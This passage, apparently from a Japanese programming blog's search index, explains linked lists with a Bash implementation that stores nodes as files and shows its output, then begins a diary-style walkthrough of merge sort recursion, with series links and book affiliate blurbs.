配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-19T15:49:34+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-19-01-mergesort-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-19-01-mergesort-suzuki/","title":"【アルゴリズム マージソート】ざっくりわかるシェルスクリプト１７"},{"content":"配列とリスト これまで配列について説明してきました。\n配列で再帰を組む方法を前回説明しました。\n配列は\n非順序配列は探索が遅い 順序配列は挿入が遅い いずれにしても削除は遅い こうした問題の一部を解決する方法に「連結リスト」というデータ構造があります。\n配列もよいけど、連結リストのほうがもっとよい、というシーンが多々あります。\n配列が得意なのは、\nデータ構造内の個々の項目に簡単にアクセスできること ですよね。ではまずは連結リストを紹介します。\n連結リスト 連結リストは、複数のデータを格納できます。\n各データは、１つ前、あるいは後ろのデータへの参照情報（リンクやポインタ）を持っています。\nリンクされたリストは、すべてのノートが次のノードを指すノードのチェーンとして視覚化することができます。\n連結リスト リンクされたリストは、アイテムを含む一連クリンクです。 各リンクには、別のリンクへの接続が含まれています。 連結リスト(リンクリスト）は、配列についで２番目によく使われるデータ構造です。 上の「HEAD」がリンクリストの先頭で、その後ろに３つのノードがあることがわかります。 ノードには、「Data Items」として値を格納することができます。 「Next」は、次のノードを参照するノード名が格納されます。 重要な点は以下のとおりです。\n連結リストには「first」というリンク要素が含まれています。 各リンクノードには、「Data Items」と「next」というフィールドがあります。 各リンクノードは、「next」を使って次のリンクノードとリンクします。 最後のリンクノードの「next」は、nullまたはnoneで終端とします。 連結リストでできること 一般的な機能\n表示-リスト全体を表示します。 挿入-リストの先頭に要素を追加します。 削除-リストの先頭にある要素を削除します。 キーを指定して検索や削除を行う機能\n検索-指定されたキーを使用して要素を検索します。 削除-指定されたキーを使用して要素を削除します。 プログラムソース この章で使っているプログラムソースは以下にあります。\n04_6LinkedList.sh 連結リスト\n挿入 まずは、連結リストに挿入してみます。\nイメージが重要なので以下の図を見てください。\nA (LeftNode) とC (RightNode)の間にNewNode を挿入したいと思います。\nまずは、NewNodeをA（LeftNode）とC（RightNode）の間に配置します。\n連結リスト挿入 次に、NewNode のNextをC（RightNode）へ参照します。\nこれにより、NewNodeの次のノードがC（RightNode）となりました。\n連結リスト挿入 次に、A（LeftNode）のNextの参照を、C(RightNode）からNewNodeへ切り替えます。\nこれで、A(LeftNode）の次のノードがNewNodeとなりました。\n連結リスト挿入 これにより、ノードNewNodeがA（LeftNoe）とC(RightNode）２つの中間に配置されます。\n新しいリストは以下の図のようになります。\n連結リスト挿入 NewNodeをリストの先頭に挿入したい場合は、上記同様の手順を Headと A（LeftNode）との間で実行すればよいわけです。\nNewNodeをリストの最後に挿入したい場合は、リストの最後のノードC(RightNode）が新しいノードNewNodeを参照し、新しいノード（NewNode）のNextは nullまたはnone を指定します。\nこれにより、新しいNewNodeがリストの終端となります。\n削除 削除は検索をすることから始まります。\n削除したいノードを検索できたとします。\nここでは削除したいノードを TargetNode として真ん中のノードを削除対象としました。\n連結リスト削除 挿入のときと同じように、TargetNode の左（前の）ノードの next は、TargetNodeの次（右）のノードを参照します。\n連結リスト削除 これにより、TargetNode を参照していたリンクが削除されます。\n連結リスト削除 これによりメモリに割り当てられていたTargetNodeが開放され、TargetNodeを完全に消去することができます。\n連結リスト削除 ヒント 削除されたTargetNodeのNextの参照をわざわざ消去する必要すらありません。 A（LeftNode）のNextがC（LeftNode）を参照していれば、TargetNode`は孤立し、リンクをたどることができなくなります。 連結リストと配列の違い 連結リストと配列の最も大きな違い\n配列\n各項目が特定の場所にあり、プログラマは配列の要素を使ってその場所に直接アクセスして探索し、挿入や削除を行います。\n連結リスト\n鎖のように連なった項目の並びをたどり歩く（走査する）子によって特定の項目を見つけます。\nEはどこにいる？と、Aにたずねます。AはBにたずね、BはCにたずねます。連結リストでは、Eに直接聞けないのでこの鎖をたどっていくのです。この処理を再帰で実装するとプログラムをよりシンプルに書くことができます。\n連結リストの効率 連結リストの先頭への「挿入」や「削除」は非常に高速です。\nそれは、つねに１つまたは２つの参照を変えるだけだからです。\n所要時間はO(1)です。\n特定の項目を見つける操作（探索、削除、途中挿入などのため）は、平均してリストの項目の半数を探索しなければなりません。\nこれは、O(N)の比較を必要とします。\n配列でも、これらの操作はO(N)でしたが、連結リストでは、挿入後や削除後の項目移動を必要としないため、その分はるかに高速です。\nメモリ上の移動に要する時間が、比較に要する時間よりも大きいときは、連結リストが配列に比べてかなり高速と言えます。\n連結リストが配列に比べて有利なのは、必要なだけのメモリしか使わない、また必要に応じて伸縮できることです。\n配列のサイズは固定ですが、それは実際のデータ量に対してメモリの無駄遣い、またはメモリ不足になりがちです。\n拡張性のある配列は、この問題をある程度解決してくれますが、拡張の幅が固定サイズの場合、メモリの使い方は連結リストほど効率的とは言えません。\n配列と連結リストのデータアクセスの違い データアクセスの場合、配列のほうが優れています。\n配列は、添え字で要素を指定できるのでワンステップで要素を指定することができます。\n連結リストは、先頭からリストをたどっていくことでしか要素を探せません。最大でNステップかかります。\n配列と連結リストのデータの追加と削除の違い データの追加、削除はリストが優れています。\n配列は、データを追加、または削除するため、後ろにあるデータをずらす必要があります。そのため、ずらすデータの数だけ余計に処理時間がかかります。\nリストでは、となりのノードを指し示す参照(Next)を書き換えるだけでデータの追加、削除を行うことができます。そのため、後ろのデータに関係なく数ステップで処理ができます。\n※削除項目を参照\n配列と連結リストのメモリ領域の違い 格納領域は、リストの方が優れています。\n配列の場合、最初に int data[100]; のように格納領域を指定するため、使わない無駄な領域が発生してしまいます。\n一方リストは参照（Next)だけで前後関係を表しており、使用領域は動的に変更することができるため、無駄がありません。\nまとめ 頻繁にデータにアクセスするようであれば「配列」 頻繁にデータを書き換える場合であれば「連結リスト」 メモリ領域を気にするなら「連結リスト」 操作内容 配列 リスト データアクセス O(1) O(N) データ挿入／削除 O(N) O(1) 配列と連結リストのハイブリッド 配列と連結リストのハイブリッドが使われます。\n具体的な事例として、名前の１文字ないし、２文字目のA〜Zまでは配列で管理し、高速アクセスを活かします。\nそこから後の名前の部分は連結リストを使って追加・削除を柔軟に行えるようにします。\nプログラムソース 今回のプログラムソースは、今後の実用性も考えて、以下の機能にに加えて、\n一般的な機能\n表示-リスト全体を表示します。 挿入-リストの先頭に要素を追加します。 削除-リストの先頭にある要素を削除します。 以下の機能も追加しています。\nキーを指定して検索や削除を行う機能\n検索-指定されたキーを使用して要素を検索します。 削除-指定されたキーを使用して要素を削除します。 ソースはやや長くなりましたが、じっくりと動かしてみてください。\n#!/bin/bash ######################################## # 連結リスト　Linked List # Bash シェルスクリプト版 ######################################## ## # final() # 実行後に行うファイナル処理 # 実行に必要なノードファイルを削除します。 function final(){ rm -fr $dirName; } ## # makeNodeFile() # ノードファイルを作成 # dirName=\u0026#34;demo\u0026#34;; list1=\u0026#34;list1\u0026#34;; node1=\u0026#34;node1\u0026#34;; node2=\u0026#34;node2\u0026#34;; node3=\u0026#34;node3\u0026#34;; # function makeNodeFile(){ rm -fr \u0026#34;$dirName\u0026#34;; mkdir -p $dirName; cd demo; :\u0026gt;$list1; echo \u0026#34;node1\u0026#34; | tee \u0026#34;$list1\u0026#34;; echo \u0026#34;3\u0026#34; | tee -a \u0026#34;$list1\u0026#34;; :\u0026gt;$node1; echo \u0026#34;node2\u0026#34; | tee \u0026#34;$node1\u0026#34;; echo \u0026#34;foo\u0026#34; | tee -a \u0026#34;$node1\u0026#34;; :\u0026gt;$node2; echo \u0026#34;node3\u0026#34; | tee \u0026#34;$node2\u0026#34;; echo \u0026#34;bar\u0026#34; | tee -a \u0026#34;$node2\u0026#34;; :\u0026gt;$node3; echo \u0026#34;none\u0026#34; | tee \u0026#34;$node3\u0026#34;; echo \u0026#34;!\u0026#34; | tee -a \u0026#34;$node3\u0026#34;; cd ../ } ## ## # addAtIdx() # 指定したインデックスに要素を追加 function addAtIdx { local first=$1; local N=$2; local dataItems=$3; if [ \u0026#34;$N\u0026#34; -eq \u0026#34;0\u0026#34; ]; then add $first $dataItems; else let prevIdx=$N-1; let size=$(tail -n1 $first)+1; prev=$(getNode $first $prevIdx); if [ \u0026#34;$N\u0026#34; -eq $(tail -n1 $first) ]; then cur=\u0026#34;none\u0026#34;; else cur=$(getNode $first $N); fi printf \u0026#34;%s\\n%s\u0026#34; $cur $dataItems \u0026gt; node$size; printf \u0026#34;%s\\n%s\u0026#34; node$size $(tail -n1 $prev) \u0026gt; $prev; printf \u0026#34;%s\\n%s\u0026#34; $(head -n1 $first) $size \u0026gt; $first; fi } ## # remove() # リストの先頭から要素を削除します。 # $1 - 追加するリストの先頭 function remove { local first=$1; local oldHead=$(head -n1 $first); local oldVal=$(tail -n1 $oldHead); let size=$(tail -n1 $first)-1; local newHead=$(head -n1 $oldHead); printf \u0026#34;%s\\n%s\u0026#34; $newHead $size \u0026gt; $first; rm $oldHead; echo $oldVal; } ## # removeAtIdx() # インデックスの要素を削除します function removeAtIdx { local first=$1; local N=$2; local prev; local cure; local Next; local oldVal; if [ \u0026#34;$N\u0026#34; -eq \u0026#34;0\u0026#34; ]; then remove $first; else let prevIdx=$N-1 let size=$(tail -n1 $first)-1 prev=$(getNode $first $prevIdx) cur=$(getNode $first $N) Next=$(head -n1 $cur) oldVal=$(tail -n1 $cur) printf \u0026#34;%s\\n%s\u0026#34; $Next $(tail -n1 $prev) \u0026gt; $prev printf \u0026#34;%s\\n%s\u0026#34; $(head -n1 $first) $size \u0026gt; $first rm $cur; echo $oldVal; fi } ## # getNode() # N番目の要素を含むノードの名前を返します。 function getNode { local first=$1; local N=$2; rest=$(head -n1 $first) let restlen=$N-1; if [ \u0026#34;$N\u0026#34; -eq \u0026#34;0\u0026#34; ]; then echo $rest; else getNode $rest $restlen; fi } ## # get() # リンクリストのN番目の要素を取得します。 function get { local currentNode=$1; local N=$2; local current=$(tail -n1 $currentNode); local rest=$(head -n1 $currentNode); let restlen=$N-1; if [ \u0026#34;$N\u0026#34; -eq \u0026#34;0\u0026#34; ]; then echo \u0026#34;$current\u0026#34;; else get $rest $restlen; fi } ## # add() # リストの先頭に要素を追加します function add { # リストの先頭を参照 local first=$1; local N=$2; local oldHead=$(head -n1 $first); let size=$(tail -n1 $first)+1; printf \u0026#34;%s\\n%s\u0026#34; $oldHead $N \u0026gt; node$size; printf \u0026#34;%s\\n%s\u0026#34; node$size $size \u0026gt; $first; } ## # printList() # 連結されたリスト全体を出力 function printList { local current=$1; local dataItems=$(tail -n1 $current); local Next=$(head -n1 $current); echo \u0026#34;データアイテム:\u0026#34; $dataItems \u0026#34;次の参照:\u0026#34; $Next; if [ \u0026#34;$Next\u0026#34; != \u0026#34;none\u0026#34; ]; then printList $Next; fi } ## # execLinkedList() # 連結リストの実行 function execLinkedList(){ # demoディレクトリへ移動 cd demo; # printList $(head -n1 $list1); printf \u0026#34;\\nリストの先頭に hello を追加\\n\u0026#34; add \u0026#34;$list1\u0026#34; \u0026#34;hello\u0026#34;; printList $(head -n1 $list1); # printf \u0026#34;\\nリストの先頭に world を追加\\n\u0026#34; add \u0026#34;$list1\u0026#34; \u0026#34;world\u0026#34; printList $(head -n1 $list1) # printf \u0026#34;\\n０から数えて１番目の要素を取得\\n\u0026#34; get $(head -n1 $list1) 1 # printf \u0026#34;\\n０から数えて１番目のノード名を取得\\n\u0026#34; getNode \u0026#34;$list1\u0026#34; 1 # printf \u0026#34;\\n０から数えて２番目に要素 327 を挿入\\n\u0026#34; addAtIdx \u0026#34;$list1\u0026#34; 2 327 printList $(head -n1 $list1) # printf \u0026#34;\\nリストの先頭に要素 94 を挿入\\n\u0026#34; addAtIdx \u0026#34;$list1\u0026#34; 0 94 printList $(head -n1 $list1) # printf \u0026#34;\\n０から数えて７番目に要素 1138 を挿入\\n\u0026#34; addAtIdx \u0026#34;$list1\u0026#34; 7 1138 printList $(head -n1 $list1) # printf \u0026#34;\\nリストの先頭の要素 %s を削除\\n\u0026#34; $(remove \u0026#34;$list1\u0026#34;) printList $(head -n1 $list1) # printf \u0026#34;\\nリストの１番目の要素 %s を削除\\n\u0026#34; $(removeAtIdx \u0026#34;$list1\u0026#34; 1) printList $(head -n1 $list1) # printf \u0026#34;\\nリスト５番目の要素 %s を削除\\n\u0026#34; $(removeAtIdx \u0026#34;$list1\u0026#34; 5) printList $(head -n1 $list1) # printf \u0026#34;\\nリストの先頭の要素 %s を削除\\n\u0026#34; $(removeAtIdx \u0026#34;list1\u0026#34; 0) printList $(head -n1 $list1) # printf \u0026#34;\\n%s を削除し初期状態に戻りました\\n\u0026#34; $(remove \u0026#34;$list1\u0026#34;) printList $(head -n1 $list1) # cd ../; } ## # メイン makeNodeFile; # makeDir makeFileなどのノードファイルを作成します。 execLinkedList final; # 作成したディレクトリを削除（当然中にあるノードファイルも消えます） exit; 実行結果 実行結果は以下のとおりです。\nbash-5.1$ bash 04_6LinkedList.sh node1 3 node2 foo node3 bar none ! データアイテム: foo 次の参照: node2 データアイテム: bar 次の参照: node3 データアイテム: ! 次の参照: none リストの先頭に hello を追加 データアイテム: hello 次の参照: node1 データアイテム: foo 次の参照: node2 データアイテム: bar 次の参照: node3 データアイテム: ! 次の参照: none リストの先頭に world を追加 データアイテム: world 次の参照: node4 データアイテム: hello 次の参照: node1 データアイテム: foo 次の参照: node2 データアイテム: bar 次の参照: node3 データアイテム: ! 次の参照: none ０から数えて１番目の要素を取得 hello ０から数えて１番目のノード名を取得 node4 ０から数えて２番目に要素 327 を挿入 データアイテム: world 次の参照: node4 データアイテム: hello 次の参照: node6 データアイテム: 327 次の参照: node1 データアイテム: foo 次の参照: node2 データアイテム: bar 次の参照: node3 データアイテム: ! 次の参照: none リストの先頭に要素 94 を挿入 データアイテム: 94 次の参照: node5 データアイテム: world 次の参照: node4 データアイテム: hello 次の参照: node6 データアイテム: 327 次の参照: node1 データアイテム: foo 次の参照: node2 データアイテム: bar 次の参照: node3 データアイテム: ! 次の参照: none ０から数えて７番目に要素 1138 を挿入 データアイテム: 94 次の参照: node5 データアイテム: world 次の参照: node4 データアイテム: hello 次の参照: node6 データアイテム: 327 次の参照: node1 データアイテム: foo 次の参照: node2 データアイテム: bar 次の参照: node3 データアイテム: ! 次の参照: node8 データアイテム: 1138 次の参照: none リストの先頭の要素 94 を削除 データアイテム: world 次の参照: node4 データアイテム: hello 次の参照: node6 データアイテム: 327 次の参照: node1 データアイテム: foo 次の参照: node2 データアイテム: bar 次の参照: node3 データアイテム: ! 次の参照: node8 データアイテム: 1138 次の参照: none リストの１番目の要素 hello を削除 データアイテム: world 次の参照: node6 データアイテム: 327 次の参照: node1 データアイテム: foo 次の参照: node2 データアイテム: bar 次の参照: node3 データアイテム: ! 次の参照: node8 データアイテム: 1138 次の参照: none リスト５番目の要素 1138 を削除 データアイテム: world 次の参照: node6 データアイテム: 327 次の参照: node1 データアイテム: foo 次の参照: node2 データアイテム: bar 次の参照: node3 データアイテム: ! 次の参照: none リストの先頭の要素 world を削除 データアイテム: 327 次の参照: node1 データアイテム: foo 次の参照: node2 データアイテム: bar 次の参照: node3 データアイテム: ! 次の参照: none 327 を削除し初期状態に戻りました データアイテム: foo 次の参照: node2 データアイテム: bar 次の参照: node3 データアイテム: ! 次の参照: none bash-5.1$ 「ざっくり」シリーズのご紹介 【アルゴリズム リスト】ざっくりわかるシェルスクリプト１６\nhttps://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/\n【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-18T11:31:36+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-18-01-list-suzuki/","title":"【アルゴリズム 連結リスト】ざっくりわかるシェルスクリプト１６"},{"content":"10月12日 今マージソートを勉強しているのですが難しいので日記をつけて整理することにしました。\nプログラムソースは以下です。\nhttps://github.com/suzukiiichiro/Algorithms-And-Data-Structures/blob/master/Bash/05_1MergeSort.sh\nロジックは配列を上半分と下半分に分割して行き、分割しきったら分割したものをマージするようにソートしていくという動きです\nイメージですと以下の動きですが\n0,1,2,3,4,5,6,7,8,9| 0,1,2,3,4|5,6,7,8,9| 0,1,2|3,4|5,6,7|8,9| 0,1|2|3|4|5,6|7|8|9| 0|1|2|3|4|5|6|7|8|9|\u0026lt;--分割しきる 0,1|2|3,4|5,6|7|8,9|\u0026lt;--マージソート開始 0,1,2|3,4|5,6,7|8,9| 0,1,2,3,4|5,6,7,8,9| 0,1,2,3,4,5,6,7,8,9| プログラムの動きは最初下半分の0,1,2,3,4を取り出し、さらにその下半分の0,1,2を取り出し、そこから0,1を取り出し、0と1に分割しきったら0,1をマージソートするというようにより下の部分を半分ずつ取り出し分割しきったらマージソートする。ソートしたらもう半分を分割してソートというような感じになります。\n0,1,2,3,4,5,6,7,8,9 0,1,2,3,4 | 0,1,2 | 0,1| 0|1| 0,1| \u0026lt;--マージソート 0,1|2| 0,1,2|\u0026lt;--マージソート |3,4| |3|4| |3,4|\u0026lt;--マージソート 0,1,2|3,4|\u0026lt;--マージソート 0,1,2,3,4|\u0026lt;--マージソート |5,6,7,8,9| |5,6| |5|6| |5,6|\u0026lt;--マージソート |5,6|7| |5,6,7|\u0026lt;--マージソート |8,9| |8|9| |8,9|\u0026lt;--マージソート |5,6,7|8,9| |5,6,7,8,9|\u0026lt;--マージソート 0,1,2,3,4|5,6,7,8,9|\u0026lt;--マージソート 0,1,2,3,4,5,6,7,8,9\u0026lt;--マージソート プログラムを見てみましょう。\nmergeメソッドをみて下さい。\n2つの再帰呼び出しと、実際にsortしているmargeSortLogicがキモです。\n・low 前半分をソート\nmergeSort \u0026ldquo;$lowerBound\u0026rdquo; \u0026ldquo;$mid\u0026rdquo; ;\n・upp 後半分をソート\nmergeSort \u0026ldquo;$((mid+1))\u0026rdquo; \u0026ldquo;$upperBound\u0026rdquo;\n・sort 両者をマージ\nmergeSortLogic \u0026ldquo;$lowerBound\u0026rdquo; \u0026ldquo;$((mid+1))\u0026rdquo; \u0026ldquo;$upperBound\u0026rdquo; ;\nlow,upp,sortの順に処理して行きます。\nlow,uppは再帰呼び出しなので、\n基底条件にマッチするまでは再帰呼び出しにより先頭にあるlowが再帰呼び出しされ続ける\nlow-\u0026gt;再帰-\u0026gt;low-\u0026gt;再帰-\u0026gt;low-\u0026gt;再帰\nlowからupp uppからsortに移動するには\n基底条件(第１引数 lowerBound 第２引数 upperBoundの値が同じ)にマッチして再帰から戻る必要がある。\nlow-\u0026gt;再帰-\u0026gt;基底条件にマッチ-\u0026gt;一つ前の再帰に戻る-\u0026gt;uppに進む\nupp-\u0026gt;再帰-\u0026gt;基底条件にマッチ-\u0026gt;一つ前の再帰に戻る-\u0026gt;sortに進む\n再帰から抜ける条件は２箇所\n・基底条件\nif [ \u0026ldquo;$lowerBound\u0026rdquo; -eq \u0026ldquo;$upperBound\u0026rdquo; ]; then\necho \u0026ldquo;1:$lowerBound$upperBound:範囲が１なら再帰呼び出しの終了 基底条件\u0026rdquo;\n#ソートは不要\n:\n・処理が最後まで行った時\nmergeSortLogic 完了時\n呼び出しの具体的な動作は以下となります。\n0,9-\u0026gt;low-\u0026gt;0,4-\u0026gt;low-\u0026gt;0,2-\u0026gt;low-\u0026gt;0,1-\u0026gt;low-\u0026gt;0,0-\u0026gt;基底条件 0,1-\u0026gt;upp-\u0026gt;1,1-\u0026gt;基底条件 0,1-\u0026gt;sort-\u0026gt;一番下(0,1をソート) 0,2-\u0026gt;upp-\u0026gt;2,2-\u0026gt;基底条件 0,2-\u0026gt;sort-\u0026gt;一番下(0,1,2をソート) 0,4-\u0026gt;upp-\u0026gt;3,4-\u0026gt;low-\u0026gt;3,3-\u0026gt;基底条件 3,4-\u0026gt;upp-\u0026gt;4,4-\u0026gt; 基底条件 3,4-\u0026gt;sort-\u0026gt;一番下(3,4をソート) 0,4-\u0026gt;sort-\u0026gt;一番下(0,1,2,3,4をソート) 0,9-\u0026gt;upp-\u0026gt;5,9-\u0026gt;low-\u0026gt;5,7-\u0026gt;low-\u0026gt;5,6-\u0026gt;low-\u0026gt;5,5-\u0026gt;基底条件 -\u0026gt;5,6-\u0026gt;upp-\u0026gt;6,6-\u0026gt;基底条件 -\u0026gt;5,6-\u0026gt;sort-\u0026gt;一番下(5,6をソート) 5,7-\u0026gt;upp-\u0026gt;7,7-\u0026gt;基底条件 5,7-\u0026gt;sort-\u0026gt;一番下(5,6,7をソート) 5,9-\u0026gt;upp-\u0026gt;8,9-\u0026gt;low-\u0026gt;8,8-\u0026gt;基底条件 8,9-\u0026gt;upp-\u0026gt;9,9-\u0026gt;基底条件 8,9-\u0026gt;sort-\u0026gt;一番下(8,9をソート) 